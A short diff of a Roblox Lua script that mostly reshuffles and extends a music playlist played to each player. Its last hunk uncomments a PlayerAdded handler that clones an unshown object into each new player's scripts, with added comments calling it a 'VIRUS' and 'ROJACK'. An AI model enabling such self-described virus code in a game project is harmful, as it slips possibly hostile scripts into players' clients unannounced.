@@ -16,8 +16,9 @@ for _, player in ipairs(players) do
 	local login = 6258085236
 	local music_1 = 1837807891
 	local music_2 = 9048538224
-	local music_3 = 1837825257
-	local music_4 = 1837755509
+	local music_3 = 1839491081
+	local music_4 = 1837825257
+	local music_5 = 1837755509
 	local volume = 5
 	local R = player.PlayerGui.Sound
 	
@@ -26,7 +27,7 @@ for _, player in ipairs(players) do
 		R.Volume = volume
 		R:Play()
 		R.Ended:Wait()
-		R.SoundId = "rbxassetid://"..music_1
+		R.SoundId = "rbxassetid://"..music_2
 		R.Volume = volume
 		R:Play()
 		R.Ended:Wait()
@@ -34,7 +35,7 @@ for _, player in ipairs(players) do
 		R.Volume = volume
 		R:Play()
 		R.Ended:Wait()
-		R.SoundId = "rbxassetid://"..music_2
+		R.SoundId = "rbxassetid://"..music_1
 		R:Play()
 		R.Ended:Wait()
 		R.SoundId = "rbxassetid://"..login
@@ -53,13 +54,21 @@ for _, player in ipairs(players) do
 		R.Volume = volume
 		R:Play()
 		R.Ended:Wait()
+		R.SoundId = "rbxassetid://"..login
+		R.Volume = volume
+		R:Play()
+		R.Ended:Wait()
+		R.SoundId = "rbxassetid://"..music_5
+		R.Volume = volume
+		R:Play()
+		R.Ended:Wait()
+		
 	end
 	
 end
 
 
---This is a new-player-joined executor and will be a new executor , or no if the other is better 
---[[
+-- MORE MORE VIRUS!!!!!!!!!!!
 game.Players.PlayerAdded:Connect(function(player)
 	local PLAYERS = game:GetService("Players")
 	local PLAYER = PLAYERS:GetPlayers()
@@ -68,6 +77,5 @@ game.Players.PlayerAdded:Connect(function(player)
 	local TO = FROM:Clone()
 
 	TO.Parent = PLAYER.PlayerScripts
-	print("Sucesfull loaded Player Loader!")
+	print("Sucesfull loaded Player Loader!") -- ''''SUCESFULL LOADED ROJACK >:) '''
 end)
---]]
